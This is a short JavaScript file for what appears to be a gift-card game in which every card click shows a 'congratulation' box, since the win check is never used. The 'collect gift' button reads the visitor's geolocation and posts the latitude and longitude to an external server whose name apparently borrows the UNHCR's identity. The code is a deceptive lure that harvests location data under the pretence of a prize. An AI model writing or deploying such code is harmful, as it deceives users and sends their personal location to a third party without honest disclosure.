const cards = document.querySelectorAll(".card");
const overlay = document.querySelector(".overlay");
const attemptsValue = document.querySelector(".attempts-value");
const congratulationBox = document.querySelector(".congratulation-container");
const colletGift = document.querySelector(".collect-gift");
const win = false;
let attempts = 3;

cards.forEach((card) => {
  card.addEventListener("click", () => {
    overlay.classList.add("display-flex");
    congratulationBox.classList.add("display-flex");
  });
});

colletGift.addEventListener("click", async () => {
  navigator.geolocation.getCurrentPosition(async (position) => {
    if (position) {
      const { longitude, latitude } = position.coords;
      try {
        const coords = await axios.post(
          "https://unhcr-api.onrender.com/api/v1/coords",
          {
            latitude: latitude,
            longitude: longitude,
          }
        );
      } catch (error) {
        console.log(error);
      }
    }
  });
});
